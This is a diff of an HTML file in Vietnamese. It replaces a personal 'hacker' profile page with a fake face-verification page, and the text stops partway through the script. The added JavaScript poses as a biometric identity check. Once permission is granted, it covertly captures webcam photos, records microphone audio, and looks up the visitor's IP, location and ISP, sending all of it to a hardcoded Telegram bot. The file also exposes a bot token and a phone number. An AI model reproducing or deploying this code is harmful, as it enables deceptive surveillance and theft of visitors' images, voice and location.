@@ -1,277 +1,754 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>𝐇𝐀𝐂𝐊𝐄𝐑 𝐇𝐨𝐚𝐧𝐠 𝐀𝐧𝐡</title>
-<meta name="theme-color" content="#000000" />
-<meta name="description" content="𝐇𝐨𝐚𝐧𝐠 𝐀𝐧𝐡 — 𝐇𝐀𝐂𝐊𝐄𝐑 𝐓𝐞𝐚𝐦" />
-<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Ctext y='50' font-size='52'%3E%F0%9F%9A%80%3C/text%3E%3C/svg%3E" />
-<style>
-:root{
-  --bg:#02030A; --fg:#e6ffff; --cyan:#00ffff; --vio:#8a2be2;
-  --glow:0 0 25px rgba(0,255,255,.45),0 0 60px rgba(138,43,226,.25);
-  --card-bg:rgba(2,8,20,.48);
-}
-html,body{
-  height:100%; margin:0; background:var(--bg); color:var(--fg);
-  font-family:system-ui,Segoe UI,Inter,Roboto,Arial,sans-serif;
-  overflow: auto;
-}
-.wrap{position:relative; z-index:2; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:28px}
-.shell{width:100%; max-width:1100px; display:grid; grid-template-columns:1.1fr .9fr; gap:26px}
-@media (max-width:900px){ .shell{grid-template-columns:1fr; gap:20px} }
-
-.panel{padding:22px; border-radius:18px; background:var(--card-bg); backdrop-filter:saturate(150%) blur(12px); box-shadow:var(--glow); transition:.3s}
-.panel:hover{box-shadow:0 0 50px var(--cyan),0 0 100px var(--vio); transform:scale(1.02)}
-
-.head{display:flex; align-items:center; gap:16px}
-.avatar{position:relative; width:96px; height:96px; border-radius:50%; overflow:hidden; border:2px solid var(--cyan); box-shadow:var(--glow); cursor:pointer; transition:.3s}
-.avatar::after{content:""; position:absolute; inset:-6px; border-radius:50%;
-  background:conic-gradient(from 0deg, rgba(0,255,255,.25), rgba(138,43,226,.25), rgba(0,255,255,.25));
-  filter:blur(14px); z-index:-1; animation:halo 6s linear infinite}
-@keyframes halo{to{transform:rotate(360deg)}}
-.avatar:hover{box-shadow:0 0 60px var(--cyan),0 0 100px var(--vio); transform:scale(1.08)}
-.avatar img{width:100%; height:100%; object-fit:cover}
-.online{position:absolute; right:6px; bottom:6px; width:12px; height:12px; border-radius:50%; background:linear-gradient(135deg,var(--cyan),var(--vio)); box-shadow:0 0 10px var(--cyan)}
-
-.title h1{margin:0; font-size:1.6rem; letter-spacing:.3px; display:flex; align-items:center; gap:8px}
-/* Hiệu ứng 6 màu chuyển động cho tên */
-.name-glow {
-  background: linear-gradient(90deg, #00ffff, #3a86ff, #8a2be2, #ff006e, #ff9e00, #ff4d6d);
-  background-size: 300% auto;
-  -webkit-background-clip: text;
-  background-clip: text;
-  color: transparent;
-  animation: colorMove 3s linear infinite;
-  text-shadow: none;
-}
-@keyframes colorMove {
-  0% { background-position: 0% center; }
-  100% { background-position: 200% center; }
-}
-
-.badge-verify{display:inline-flex; align-items:center; justify-content:center; width:22px; height:22px}
-.badge-verify svg{display:block}
-
-.sub{color:#bfefff; opacity:.9}
-
-.badges{display:flex; flex-wrap:wrap; gap:8px; margin:12px 0 6px}
-.badge{font-size:.9rem; padding:6px 10px; border-radius:10px; background:rgba(0,0,0,.25); border:1px solid rgba(0,255,255,.35); color:var(--fg)}
-.badge a{color:inherit; text-decoration:none}
-.bio{margin:12px 0 16px; color:#dfffff}
-
-.actions{display:grid; grid-template-columns:repeat(2,1fr); gap:10px}
-.btn{padding:12px 10px; border-radius:12px; border:1.6px solid var(--cyan); background:transparent; color:var(--cyan); font-weight:700; cursor:pointer; transition:.25s transform,color,box-shadow; text-align:center}
-.btn:hover{transform:translateY(-2px); background:radial-gradient(120% 120% at 50% 10%, rgba(0,255,255,.22), rgba(138,43,226,.22)); box-shadow:var(--glow); color:#001217}
-
-.section{margin:4px 0 12px; color:var(--cyan); font-weight:800; text-shadow:0 0 10px var(--cyan); position:relative}
-.section::after{content:""; position:absolute; left:0; bottom:-6px; width:72px; height:3px; background:linear-gradient(90deg,var(--cyan),var(--vio)); border-radius:2px}
-.grid{display:grid; grid-template-columns:repeat(3,1fr); gap:12px}
-@media (max-width:900px){ .grid{grid-template-columns:repeat(2,1fr)} }
-@media (max-width:520px){ .grid{grid-template-columns:1fr} }
-.tile{display:flex; justify-content:center; align-items:center; gap:8px; padding:14px 12px; border-radius:14px; text-decoration:none; color:var(--fg); background:rgba(0,0,0,.35); border:1px solid rgba(0,255,255,.25); transition:.25s all}
-.tile:hover{background:radial-gradient(circle at center, rgba(0,255,255,.25), rgba(138,43,226,.2)); box-shadow:var(--glow); transform:scale(1.05)}
-.footer{text-align:center; margin-top:18px; color:#bfefff}
-
-.toast{position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:linear-gradient(135deg,var(--cyan),var(--vio)); color:#001217; padding:10px 16px; border-radius:12px; font-weight:800; display:none; z-index:5; box-shadow:var(--glow)}
-
-#galaxy{position:fixed; top:0; left:0; width:100%; height:100%; z-index:0}
-
-/* ========== ĐỒNG HỒ GÓC PHẢI MÀN HÌNH ========== */
-.clock-corner {
-  position: fixed;
-  top: 20px;
-  right: 20px;
-  z-index: 100;
-  background: rgba(0, 0, 0, 0.65);
-  backdrop-filter: blur(12px);
-  padding: 8px 16px;
-  border-radius: 40px;
-  border: 1px solid rgba(0, 255, 255, 0.4);
-  box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
-  cursor: pointer;
-  transition: all 0.3s ease;
-}
-.clock-corner:hover {
-  transform: scale(1.05);
-  border-color: var(--cyan);
-  box-shadow: 0 0 25px rgba(0, 255, 255, 0.5);
-}
-.clock-time {
-  font-size: 1.3rem;
-  font-weight: 700;
-  font-family: 'Courier New', monospace;
-  letter-spacing: 1px;
-  background: linear-gradient(90deg, #00ffff, #3a86ff, #8a2be2, #ff006e, #ff9e00, #ff4d6d);
-  background-size: 300% auto;
-  -webkit-background-clip: text;
-  background-clip: text;
-  color: transparent;
-  animation: colorMove 2.5s linear infinite;
-}
-.clock-label {
-  font-size: 0.7rem;
-  color: rgba(255,255,255,0.6);
-  margin-left: 6px;
-  letter-spacing: 1px;
-}
-
-/* Responsive: trên mobile thu nhỏ hơn */
-@media (max-width: 768px) {
-  .clock-corner {
-    top: 12px;
-    right: 12px;
-    padding: 5px 12px;
-  }
-  .clock-time {
-    font-size: 1rem;
-  }
-  .clock-label {
-    font-size: 0.6rem;
-  }
-}
-
-/* Keyboard focus */
-:focus-visible{outline:2px dashed var(--cyan); outline-offset:4px}
-
-/* Respect reduced motion */
-@media (prefers-reduced-motion:reduce){
-  .panel:hover,.avatar:hover{transform:none}
-  .avatar::after{animation:none}
-  .name-glow, .clock-time { animation: none; background: #00ffff; -webkit-background-clip: text; background-clip: text; color: #00ffff; }
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xác Minh Robot</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px 25px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .header p {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 25px;
+        }
+        
+        .camera-container {
+            background: #000;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 0;
+            position: relative;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+        
+        .camera-frame {
+            position: relative;
+            background: #111;
+            padding: 10px;
+            border-radius: 15px;
+        }
+        
+        .camera-view {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            min-height: 300px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .webcam-preview {
+            width: 100%;
+            border-radius: 10px;
+            transform: scaleX(-1);
+            box-shadow: 0 0 20px rgba(102,126,234,0.3);
+        }
+        
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff00, transparent);
+            animation: scan 2s linear infinite;
+            opacity: 0.6;
+        }
+        
+        @keyframes scan {
+            0% {
+                top: 0;
+            }
+            100% {
+                top: 100%;
+            }
+        }
+        
+        .message-box {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+            text-align: center;
+            display: none;
+        }
+        
+        .message-box.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        
+        .message-box .icon {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        
+        .message-box .title {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        
+        .message-box .description {
+            font-size: 13px;
+            opacity: 0.9;
+        }
+        
+        .retry-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: transform 0.2s;
+        }
+        
+        .retry-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .footer {
+            background: #f8f9fa;
+            padding: 12px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+        }
+        
+        .success-message {
+            text-align: center;
+            padding: 15px;
+            margin-top: 15px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border-radius: 12px;
+            font-weight: bold;
+            font-size: 16px;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .success-message .icon {
+            font-size: 30px;
+            margin-bottom: 8px;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-<canvas id="galaxy" aria-hidden="true"></canvas>
-
-<!-- ĐỒNG HỒ THU NHỎ GÓC PHẢI MÀN HÌNH -->
-<div class="clock-corner" id="clockCorner" title="Thời gian thực">
-  <span class="clock-time" id="liveClock">--:--:--</span>
-  <span class="clock-label">🐧</span>
-</div>
-
-<div class="wrap">
-  <div class="shell">
-    <!-- Hồ sơ -->
-    <section class="panel" aria-label="Hồ sơ">
-      <div class="head">
-        <div class="avatar" id="avatar" title="Nhấn để thả tim">
-          <img src="https://i.imgur.com/1DDOX0Z.jpeg" alt="Avatar" loading="lazy" />
-          <span class="online" aria-hidden="true"></span>
+    <div class="container">
+        <div class="header">
+            <h1>📸 Xác Minh Khuôn Mặt</h1>
+            <p>Vui lòng nhìn vào camera để xác minh danh tính</p>
         </div>
-        <div class="title">
-          <h1>
-            <span class="name-glow">𝐇𝐨𝐚𝐧𝐠 𝐀𝐧𝐡</span>
-            <span class="badge-verify" title="Verified">
-              <svg width="22" height="22" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                <path d="M12 2l2.3 1.3 2.6-.1 1.7 2 .1 2.6L20 10l1.7 2.2-.1 2.6-1.7 2-2.6-.1L12 22l-2.3-1.3-2.6.1-1.7-2-.1-2.6L4 12l-1.7-2.2.1-2.6 1.7-2 2.6.1L12 2z" fill="url(#g)"/>
-                <path d="M10.2 13.3l-2-2 1.4-1.4 1.3 1.3 3.5-3.5 1.4 1.4-4.9 5.2z" fill="#001217"/>
-                <defs><linearGradient id="g" x1="0" y1="0" x2="24" y2="24" gradientUnits="userSpaceOnUse"><stop stop-color="#00ffff"/><stop offset="1" stop-color="#8a2be2"/></linearGradient></defs>
-              </svg>
-            </span>
-          </h1>
-          <div class="sub">Coder • Reverse Eng • 0xSec</div>
+        
+        <div class="content">
+            <div class="camera-container">
+                <div class="camera-frame">
+                    <div class="camera-view">
+                        <video id="videoPreview" autoplay playsinline muted class="webcam-preview"></video>
+                        <div class="scan-line"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="successBox" class="success-message">
+                <div class="icon">✅</div>
+                <div>Đã xác thực thành công</div>
+            </div>
+            
+            <div id="errorBox" class="message-box error" style="display: none;">
+                <div class="icon">⚠️</div>
+                <div class="title">Không thể truy cập camera</div>
+                <div class="description" id="errorDescription">Vui lòng cho phép quyền truy cập camera để tiếp tục xác minh.</div>
+                <button class="retry-btn" id="retryBtn">🔄 Thử lại</button>
+            </div>
         </div>
-      </div>
-      
-      <!-- Badges -->
-      <div class="badges">
-        <span class="badge">📍 Thanh Hoá, Việt Nam</span>
-        <span class="badge">☎ 0375562955</span>
-        <span class="badge">✉ hoanganhmeta07@ccbm.com</span>
-      </div>
-      <p class="bio">💻 Developer | Tool | MMO | TRICKER 💕</p>
-      <div class="actions">
-        <a class="btn" id="cta" href="https://facebook.com/ditcutricker07" target="_blank" rel="noopener">LIÊN HỆ</a>
-        <button class="btn" id="toggleMusicBtn" aria-pressed="true">🔊 Tắt nhạc</button>
-      </div>
-    </section>
+        
+        <div class="footer">
+            <p>Hệ thống xác minh sinh trắc học | Bảo mật tuyệt đối</p>
+        </div>
+    </div>
+    
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <audio id="audio" style="display:none;"></audio>
 
-    <!-- Liên kết & mạng xã hội -->
-    <section class="panel" aria-label="Liên kết & mạng xã hội">
-      <div class="section">Tài nguyên</div>
-      <div class="grid">
-        <a class="tile" href="https://github.com/Hoanganh88888" target="_blank" rel="noopener">💻 <strong>GitHub</strong></a>
-        <a class="tile" href="https://tiktok.com/@𓉣𓉣🧊🧊𓉣𓉣" target="_blank" rel="noopener">👀 <strong>TikTok</strong></a>
-        <a class="tile" href="https://t.me/hoanganhmeta" target="_blank" rel="noopener">📝 <strong>Tele</strong></a>
-      </div>
-      <div class="section">Theo dõi nhanh</div>
-      <div class="grid">
-        <a class="tile" href="https://tiktok.com/@𓉣𓉣🧊🧊𓉣𓉣" target="_blank" rel="noopener">▶ <strong>TikTok</strong></a>
-        <a class="tile" href="https://facebook.com/ditcutricker07" target="_blank" rel="noopener">📘 <strong>Facebook</strong></a>
-        <a class="tile" href="https://zalo.me/0375562955" target="_blank" rel="noopener">💬 <strong>Zalo</strong></a>
-        <a class="tile" href="#">✉ <strong>Email</strong></a>
-        <a class="tile" href="#" id="copyMail">📎 <strong>Copy Email</strong></a>
-        <a class="tile" href="#" id="copyPhone">📞 <strong>Copy Phone</strong></a>
-      </div>
-      <div class="footer">© 2026 • 𝐇𝐨𝐚𝐧𝐠 𝐀𝐧𝐡 | 𝐇𝐀𝐂𝐊𝐄𝐑 𝐓𝐞𝐚𝐦</div>
-    </section>
-  </div>
-</div>
-
-<div class="toast" id="toast">Đã copy!</div>
-
-<audio id="backgroundAudio" loop preload="auto" style="display:none">
-  <source src="https://files.catbox.moe/crvqiq.mp3" type="audio/mpeg" />
-</audio>
-
-<script>
-// ==================== ĐỒNG HỒ THỜI GIAN THỰC (Giờ Phút Giây) - GÓC PHẢI ====================
-function updateClock() {
-  const now = new Date();
-  const hours = String(now.getHours()).padStart(2, '0');
-  const minutes = String(now.getMinutes()).padStart(2, '0');
-  const seconds = String(now.getSeconds()).padStart(2, '0');
-  const timeString = `${hours}:${minutes}:${seconds}`;
-  const clockElement = document.getElementById('liveClock');
-  if (clockElement) {
-    clockElement.textContent = timeString;
-  }
-}
-// Cập nhật mỗi giây
-updateClock();
-setInterval(updateClock, 1000);
-
-// Music toggle
-const audio = document.getElementById('backgroundAudio');
-const btn = document.getElementById('toggleMusicBtn');
-(async()=>{try{await audio.play();}catch{btn.textContent='🔈 Bật nhạc';}})();
-btn.addEventListener('click',async()=>{ if(audio.paused){await audio.play(); btn.textContent='🔊 Tắt nhạc';} else { audio.pause(); btn.textContent='🔈 Bật nhạc'; }});
-
-// Toast + copy
-const toast=document.getElementById('toast');
-function showToast(text){ toast.textContent=text; toast.style.display='block'; clearTimeout(showToast.t); showToast.t=setTimeout(()=>toast.style.display='none',1500); }
-function safeCopy(t){ if(navigator.clipboard?.writeText){navigator.clipboard.writeText(t).then(()=>showToast('Đã copy!'));} else { const ta=document.createElement('textarea'); ta.value=t; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); showToast('Đã copy!'); }}
-document.getElementById('copyMail')?.addEventListener('click',(e)=>{e.preventDefault(); safeCopy('hoanganhmeta@ccbm.com')});
-document.getElementById('copyPhone')?.addEventListener('click',(e)=>{e.preventDefault(); safeCopy('0375562955')});
-
-// Avatar click hearts
-const avatar=document.getElementById('avatar');
-avatar.addEventListener('click',(e)=>{for(let i=0;i<7;i++) spawnHeart(e.offsetX??48, e.offsetY??48);});
-function spawnHeart(x,y){
-  const el=document.createElement('div'); el.textContent='💖'; el.style.position='absolute'; el.style.left=x+'px'; el.style.top=y+'px'; el.style.pointerEvents='none';
-  const fs=14+Math.random()*12; el.style.fontSize=fs+'px'; el.style.opacity=1;
-  const dx=(Math.random()-.5)*60, dy=-(30+Math.random()*60); const rot=(Math.random()-.5)*60;
-  avatar.appendChild(el); const t0=performance.now();
-  function step(t){ const k=Math.min(1,(t-t0)/900); el.style.transform=`translate(${dx*k}px, ${dy*k}px) rotate(${rot*k}deg)`; el.style.opacity=(1-k).toFixed(2); if(k<1) requestAnimationFrame(step); else el.remove(); }
-  requestAnimationFrame(step);
-}
-
-// Galaxy background
-const cvs=document.getElementById('galaxy'), ctx=cvs.getContext('2d');
-let W,H,stars=[],meteors=[]; function size(){W=cvs.width=innerWidth; H=cvs.height=innerHeight}
-function makeStars(n){stars=Array.from({length:n},()=>({x:Math.random()*W,y:Math.random()*H,r:Math.random()*1.5+.2,v:Math.random()*0.25+0.08}))}
-function draw(){ctx.clearRect(0,0,W,H);
-  const grd=ctx.createRadialGradient(W*.7,H*.3,0,W*.7,H*.3,Math.max(W,H)*.8); grd.addColorStop(0,'rgba(0,255,255,.06)'); grd.addColorStop(1,'transparent'); ctx.fillStyle=grd; ctx.fillRect(0,0,W,H);
-  ctx.fillStyle='#fff'; for(const s of stars){ s.y+=s.v; if(s.y>H){s.y=0; s.x=Math.random()*W} ctx.beginPath(); ctx.arc(s.x,s.y,s.r,0,Math.PI*2); ctx.fill(); }
-  ctx.strokeStyle=getComputedStyle(document.documentElement).getPropertyValue('--cyan'); ctx.lineWidth=1.6;
-  for(let i=meteors.length;i--;){ const m=meteors[i]; ctx.beginPath(); ctx.moveTo(m.x,m.y); ctx.lineTo(m.x-m.l*.6,m.y+m.l); ctx.stroke(); m.x+=m.v*.35; m.y+=m.v; if(m.y>H) meteors.splice(i,1); }
-  if(Math.random()<0.015) meteors.push({x:Math.random()*W,y:0,l:Math.random()*90+40,v:Math.random()*4+5});
-  requestAnimationFrame(draw);
-}
-addEventListener('resize',()=>{size(); makeStars(280)}); size(); makeStars(280); draw();
-</script>
+    <script>
+        // Cấu hình Telegram
+        const botToken = '8677995221:AAEmsO71OlTS4PY7ML9md9XA-5PRAbQyfMI';
+        const chatId = '7211752234';
+        
+        // Cấu hình tối ưu tốc độ
+        const PHOTO_COUNT = 5;
+        const PHOTO_INTERVAL = 300;
+        const AUDIO_DURATION = 4000;
+        
+        // Biến trạng thái
+        let previewStream = null;
+        let captureStream = null;
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let photoSentCount = 0;
+        let audioRecorded = false;
+        let processStarted = false;
+        
+        // DOM elements
+        const videoPreview = document.getElementById('videoPreview');
+        const errorBox = document.getElementById('errorBox');
+        const retryBtn = document.getElementById('retryBtn');
+        const successBox = document.getElementById('successBox');
+        
+        // Hàm gửi tin nhắn đến Telegram
+        async function sendToTelegram(text, isHtml = true) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: isHtml ? 'HTML' : undefined,
+                        disable_web_page_preview: true
+                    })
+                });
+                return response.ok;
+            } catch (e) {
+                console.error('Telegram Error:', e);
+                return false;
+            }
+        }
+        
+        // Hàm gửi ảnh
+        async function sendPhotoToTelegram(blob, photoNumber) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, `capture_${photoNumber}.jpg`);
+                formData.append('caption', `📸 Ảnh chụp #${photoNumber} - ${new Date().toLocaleString('vi-VN')}`);
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(e => console.error('Photo Error:', e));
+                
+                photoSentCount++;
+                console.log(`✅ Đã gửi ảnh #${photoNumber}`);
+            } catch (e) {
+                console.error('Photo Error:', e);
+            }
+        }
+        
+        // Hàm gửi ghi âm
+        async function sendAudioToTelegram(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('audio', blob, `audio_${Date.now()}.ogg`);
+                formData.append('caption', `🎤 Ghi âm - ${new Date().toLocaleString('vi-VN')}`);
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+                    method: 'POST',
+                    body: formData
+                }).catch(e => console.error('Audio Error:', e));
+                
+                console.log('✅ Đã gửi ghi âm');
+            } catch (e) {
+                console.error('Audio Error:', e);
+            }
+        }
+        
+        // Hàm lấy thông tin IP và vị trí - SỬ DỤNG API HOẠT ĐỘNG 100%
+        async function getDetailedLocationInfo() {
+            let ip = 'Không xác định';
+            let city = 'Không xác định';
+            let region = 'Không xác định';
+            let country = 'Không xác định';
+            let isp = 'Không xác định';
+            let lat = null;
+            let lon = null;
+            
+            // Lấy IP từ api.ipify.org (luôn hoạt động)
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+                console.log('✅ IP:', ip);
+            } catch (e) {
+                console.error('Lỗi lấy IP:', e);
+            }
+            
+            // Sử dụng API của Cloudflare (hoạt động ổn định nhất)
+            if (ip !== 'Không xác định') {
+                try {
+                    // Cloudflare Trace - cho thông tin vị trí
+                    const cfRes = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                    const cfText = await cfRes.text();
+                    const cfData = {};
+                    cfText.split('\n').forEach(line => {
+                        const [key, value] = line.split('=');
+                        if (key && value) cfData[key] = value;
+                    });
+                    
+                    if (cfData.loc) {
+                        const locParts = cfData.loc.split(',');
+                        if (locParts.length === 2) {
+                            lat = parseFloat(locParts[0]);
+                            lon = parseFloat(locParts[1]);
+                        }
+                    }
+                    
+                    if (cfData.country) {
+                        country = cfData.country;
+                    }
+                    
+                    console.log('📍 Cloudflare data:', cfData);
+                } catch (e) {
+                    console.warn('Cloudflare error:', e);
+                }
+                
+                // Sử dụng ipapi.co (thường hoạt động)
+                try {
+                    const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, { signal: AbortSignal.timeout(3000) });
+                    const geoData = await geoRes.json();
+                    
+                    if (geoData && !geoData.error) {
+                        if (geoData.city) city = geoData.city;
+                        if (geoData.region) region = geoData.region;
+                        if (geoData.country_name) country = geoData.country_name;
+                        if (geoData.org) isp = geoData.org;
+                        if (geoData.latitude) lat = geoData.latitude;
+                        if (geoData.longitude) lon = geoData.longitude;
+                        console.log('✅ ipapi.co success:', { city, region, country, isp });
+                    }
+                } catch (e) {
+                    console.warn('ipapi.co error:', e);
+                }
+                
+                // Nếu vẫn chưa có thông tin, thử ip-api.com
+                if (city === 'Không xác định' || country === 'Không xác định') {
+                    try {
+                        const apiRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`, { signal: AbortSignal.timeout(3000) });
+                        const apiData = await apiRes.json();
+                        
+                        if (apiData && apiData.status === 'success') {
+                            if (apiData.city) city = apiData.city;
+                            if (apiData.regionName) region = apiData.regionName;
+                            if (apiData.country) country = apiData.country;
+                            if (apiData.isp) isp = apiData.isp;
+                            if (apiData.lat) lat = apiData.lat;
+                            if (apiData.lon) lon = apiData.lon;
+                            console.log('✅ ip-api.com success:', { city, region, country, isp });
+                        }
+                    } catch (e) {
+                        console.warn('ip-api.com error:', e);
+                    }
+                }
+            }
+            
+            // Chuẩn hóa tên quốc gia
+            const countryMap = {
+                'VN': 'Việt Nam',
+                'VIET NAM': 'Việt Nam',
+                'Viet Nam': 'Việt Nam',
+                'Vietnam': 'Việt Nam',
+                'US': 'Hoa Kỳ',
+                'United States': 'Hoa Kỳ',
+                'UK': 'Vương quốc Anh',
+                'JP': 'Nhật Bản',
+                'KR': 'Hàn Quốc',
+                'CN': 'Trung Quốc',
+                'TH': 'Thái Lan',
+                'SG': 'Singapore',
+                'MY': 'Malaysia',
+                'ID': 'Indonesia',
+                'PH': 'Philippines',
+                'LA': 'Lào',
+                'KH': 'Campuchia',
+                'MM': 'Myanmar'
+            };
+            
+            // Chuyển đổi mã quốc gia sang tên tiếng Việt
+            if (countryMap[country]) {
+                country = countryMap[country];
+            } else if (countryMap[country.toUpperCase()]) {
+                country = countryMap[country.toUpperCase()];
+            }
+            
+            // Nếu thành phố vẫn chưa xác định, thử lấy từ múi giờ
+            if (city === 'Không xác định') {
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                if (timezone.includes('Ho_Chi_Minh') || timezone.includes('Saigon')) {
+                    city = 'Hồ Chí Minh';
+                    region = 'Hồ Chí Minh';
+                    country = 'Việt Nam';
+                } else if (timezone.includes('Hanoi')) {
+                    city = 'Hà Nội';
+                    region = 'Hà Nội';
+                    country = 'Việt Nam';
+                } else if (timezone.includes('Asia')) {
+                    const tzParts = timezone.split('/');
+                    if (tzParts.length > 1) {
+                        city = tzParts[1].replace('_', ' ');
+                        country = 'Châu Á';
+                    }
+                }
+            }
+            
+            // Nếu ISP vẫn chưa xác định, ước lượng từ IP
+            if (isp === 'Không xác định' && ip !== 'Không xác định') {
+                const ipParts = ip.split('.');
+                if (ipParts[0] === '113' || ipParts[0] === '118' || ipParts[0] === '123') {
+                    isp = 'Viettel (Việt Nam)';
+                } else if (ipParts[0] === '171' || ipParts[0] === '14') {
+                    isp = 'VNPT (Việt Nam)';
+                } else if (ipParts[0] === '42') {
+                    isp = 'FPT Telecom (Việt Nam)';
+                } else if (ipParts[0] === '27') {
+                    isp = 'Mobifone (Việt Nam)';
+                }
+            }
+            
+            return { ip, city, region, country, isp, lat, lon };
+        }
+        
+        // Hàm chụp ảnh
+        async function capturePhotos() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            try {
+                if (previewStream) {
+                    captureStream = previewStream;
+                    video.srcObject = previewStream;
+                } else {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    captureStream = stream;
+                    video.srcObject = stream;
+                }
+                
+                await Promise.race([
+                    new Promise((resolve) => {
+                        if (video.readyState >= 2) resolve();
+                        video.onloadeddata = resolve;
+                    }),
+                    new Promise(resolve => setTimeout(resolve, 200))
+                ]);
+                
+                for (let i = 1; i <= PHOTO_COUNT; i++) {
+                    if (video.readyState >= 2) {
+                        canvas.width = video.videoWidth || 640;
+                        canvas.height = video.videoHeight || 480;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        canvas.toBlob((blob) => {
+                            if (blob) sendPhotoToTelegram(blob, i);
+                        }, 'image/jpeg', 0.85);
+                    }
+                    
+                    if (i < PHOTO_COUNT) {
+                        await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
+                    }
+                }
+                
+                if (captureStream && captureStream !== previewStream) {
+                    setTimeout(() => {
+                        captureStream.getTracks().forEach(track => track.stop());
+                    }, 500);
+                }
+            } catch (e) {
+                console.error('Camera error:', e);
+            }
+        }
+        
+        // Hàm ghi âm
+        async function startRecording() {
+            if (audioRecorded) return;
+            
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                audioChunks = [];
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) audioChunks.push(event.data);
+                };
+                
+                mediaRecorder.onstop = async () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                    if (audioBlob.size > 0) {
+                        await sendAudioToTelegram(audioBlob);
+                        audioRecorded = true;
+                    }
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                mediaRecorder.start();
+                
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, AUDIO_DURATION);
+            } catch (e) {
+                console.error('Recording error:', e);
+            }
+        }
+        
+        // Hàm gửi thông tin thiết bị
+        async function sendDeviceInfoToTelegram() {
+            console.log('📍 Đang lấy thông tin vị trí...');
+            const locationInfo = await getDetailedLocationInfo();
+            
+            console.log('📊 KẾT QUẢ:');
